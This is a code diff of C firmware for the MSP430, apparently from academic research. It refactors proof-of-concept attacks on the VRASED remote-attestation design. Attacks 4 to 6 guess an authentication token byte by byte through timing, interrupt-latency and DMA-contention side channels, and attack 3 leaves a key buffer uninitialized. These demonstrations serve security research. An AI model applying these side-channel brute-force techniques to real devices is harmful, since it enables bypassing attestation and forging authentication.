@@ -27,8 +27,6 @@ hmac(
 
 #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
 
-int attack_iteration;
-
 /**
  * VRASED_A: authenticated attestation
  * We based the code on the RATA implementation, which only differs from the code
@@ -75,7 +73,6 @@ __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() 
     //Save application stack pointer.
     //Allocate key buffer.
     #if __ATTACK == 3
-
     /**
      * NOTE: we explicitly remove the (redundant) zero-initialization here, as
      * it may generate an early reset when writing out of the MAC region.
@@ -83,9 +80,7 @@ __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() 
      * away the redundant zero-intialization when noticing the explicit memcpy
      * initialization below (e.g., as validated with clang-msp430).
      * */
-
     uint8_t key[64];
-
     #else
     uint8_t key[64] = {0};
     #endif
@@ -131,7 +126,6 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
  * MAC region: [0x0230, 0x250[
  * NOTE: leave 12 bytes for local variables of memcpy function
  * */
-
 #define STACK_POISON_ADDRESS            (MAC_ADDR + KEY_SIZE + 12)
 
 /* stringify macro parameter a */
@@ -157,123 +151,10 @@ void leak_key(uint8_t *buf, int start, int end)
     printf("\n");
 }
 
+int attack_iteration = 0;
+
 void VRASED (uint8_t *challenge, uint8_t *response) {
     printf("Attack: %d\n", __ATTACK);
-
-    #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
-    attack4:
-      /* modifying the counter address for demonstration purposes; normally this
-         would also be protected (but its value is known to the attacker) */
-      my_memset(CTR_ADDR, 32, 0);
-
-      my_memset(VRF_AUTH, 32, 0);
-      uint8_t * verification = (uint8_t*) VRF_AUTH;
-      /* correct verification value: 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3 */
-    #endif
-
-    #if __ATTACK == 4
-      switch (attack_iteration) {
-      case 0:
-        verification[0] = 0x42;
-        verification[1] = 0x42;
-        break;
-      case 1:
-        verification[0] = 0x44;
-        verification[1] = 0x42;
-        break;
-      case 2:
-        verification[0] = 0x44;
-        verification[1] = 0x4e;
-        break;
-      }
-
-      /* setting up the clock for time measurement */
-      TACTL = TACLR | MC_2 | TASSEL_2;
-    #endif
-
-    #if __ATTACK == 5
-      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
-        uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
-        printf("Interrupt delay: %u\n", delay);
-
-        /**
-         * In case the delay is 14486, it means the interrupt was served in one
-         * cycle: it hit the `mov.b` instruction (pc: b0b6) that is already
-         * outside of the comparison loop in `memcmp`.
-         * In case the delay is one cycle longer, that indicates interrupting
-         * during the `jmp` instruction (pc: b0be) that jumps back to the start
-         * of the comparison loop in `memcmp`, indicating that the first byte
-         * was correctly guessed.
-         * */
-
-        if (delay == 14486) {
-          attack_iteration++;
-          printf("First byte not guessed, retrying\n");
-        } else {
-          printf("First byte guessed, finishing\n");
-          return;
-        }
-      } else {
-        printf("First run\n");
-      }
-
-      switch (attack_iteration) {
-      case 0:
-        verification[0] = 0x42;
-        verification[1] = 0x42;
-        break;
-      case 1:
-        verification[0] = 0x44;
-        verification[1] = 0x42;
-        break;
-      }
-
-      /* setting up the clock for interrupting */
-      TACCR0 = 26385;
-      *((uint16_t*) DMA_ATTACKER_RESET_CNT) = 0;
-      TACTL = TACLR | MC_1 | TASSEL_2 | ID_3 | TAIE;
-    #endif
-
-    #if __ATTACK == 6
-      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
-        uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
-        printf("DMA delayed: %s\n", delayed ? "Yes" : "No");
-
-        /**
-         * Similar to above, we aim the DMA data memory request to the same
-         * cycle when the `memcmp` loads the byte to be compared from data
-         * memory.
-         * If the contention happens, that means the next byte was fetched,
-         * indicating that the comparison for the current byte succeeded, the
-         * guessed value was correct.
-         * */
-
-        if (!delayed) {
-          attack_iteration++;
-          printf("First byte not guessed, retrying\n");
-        } else {
-          printf("First byte guessed, finishing\n");
-          return;
-        }
-      } else {
-        printf("First run\n");
-      }
-
-      switch (attack_iteration) {
-      case 0:
-        verification[0] = 0x42;
-        verification[1] = 0x42;
-        break;
-      case 1:
-        verification[0] = 0x44;
-        verification[1] = 0x42;
-        break;
-      }
-
-      /* setting up the timed dma request */
-      *((uint16_t*) DMA_ATTACKER_COUNTDOWN) = 26387;
-      __asm__ volatile("nop\n"); /* skipping one cycle for precise timing */
-    #endif
 
     #if __ATTACK == 1
       leak_key((uint8_t*) KEY_ADDR, 31, 64);
@@ -298,6 +179,103 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
       } else {
         printf("First run\n");
       }
+    #endif
+
+    #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
+      /* Initializing the counter address for demonstration purposes; normally this
+         would also be protected (but its value is known to the attacker) */
+      my_memset((uint8_t*) CTR_ADDR, 32, 0);
+
+      my_memset((uint8_t*) VRF_AUTH, 32, 0);
+      uint8_t * verification = (uint8_t*) VRF_AUTH;
+
+      /* NOTE: Brute-forcing the entire verification token is possible in
+       * linear time, but will still take long in the iverilog simulation.
+       * Hence, our PoC only demonstrates timing leakage for the first two
+       * bytes with demonstration guesses chosen as follows.
+       *
+       * Correct verification token is:
+       * 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3
+       */
+    attack4:
+      switch (attack_iteration) {
+      case 0:
+        verification[0] = 0x42;
+        verification[1] = 0x42;
+        break;
+      case 1:
+        verification[0] = 0x44;
+        verification[1] = 0x42;
+        break;
+      case 2:
+        verification[0] = 0x44;
+        verification[1] = 0x4e;
+        break;
+      }
+      attack_iteration++;
+    #endif
+
+    #if __ATTACK == 4
+      /* setting up the clock for time measurement */
+      TACTL = TACLR | MC_2 | TASSEL_2;
+    #endif
+
+    #if __ATTACK == 5
+      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+        uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
+        printf("Interrupt delay: %u\n", delay);
+
+        /**
+         * In case the delay is 14486, it means the interrupt was served in one
+         * cycle: it hit the `mov.b` instruction (pc: b0b6) that is already
+         * outside of the comparison loop in `memcmp`.
+         * In case the delay is one cycle longer, that indicates interrupting
+         * during the `jmp` instruction (pc: b0be) that jumps back to the start
+         * of the comparison loop in `memcmp`, indicating that the first byte
+         * was correctly guessed.
+         * */
+        if (delay == 14486) {
+          printf("First byte not guessed, retrying\n");
+        } else {
+          printf("First byte guessed, finishing\n");
+          return;
+        }
+      } else {
+        printf("First run\n");
+      }
+
+      /* setting up the clock for interrupting */
+      TACCR0 = 26385;
+      *((uint16_t*) DMA_ATTACKER_RESET_CNT) = 0;
+      TACTL = TACLR | MC_1 | TASSEL_2 | ID_3 | TAIE;
+    #endif
+
+    #if __ATTACK == 6
+      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+        uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
+        printf("DMA delayed: %s\n", delayed ? "Yes" : "No");
+
+        /**
+         * Similar to above, we aim the DMA data memory request to the same
+         * cycle when the `memcmp` loads the byte to be compared from data
+         * memory.
+         * If the contention happens, that means the next byte was fetched,
+         * indicating that the comparison for the current byte succeeded, the
+         * guessed value was correct.
+         * */
+        if (!delayed) {
+          printf("First byte not guessed, retrying\n");
+        } else {
+          printf("First byte guessed, finishing\n");
+          return;
+        }
+      } else {
+        printf("First run\n");
+      }
+
+      /* setting up the timed dma request */
+      *((uint16_t*) DMA_ATTACKER_COUNTDOWN) = 26387;
+      __asm__ volatile("nop\n"); /* skipping one cycle for precise timing */
     #endif
 
     //Copy input challenge to MAC_ADDR:
@@ -352,8 +330,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
         attack_iteration,
         tar,
         (tar - 14511) / 13); /* Cycle count: 14511 + (guessed_byte_count * 13) */
-      if (attack_iteration < 2) {
-        attack_iteration++;
+      if (attack_iteration <= 2) {
         goto attack4;
       }
     #endif
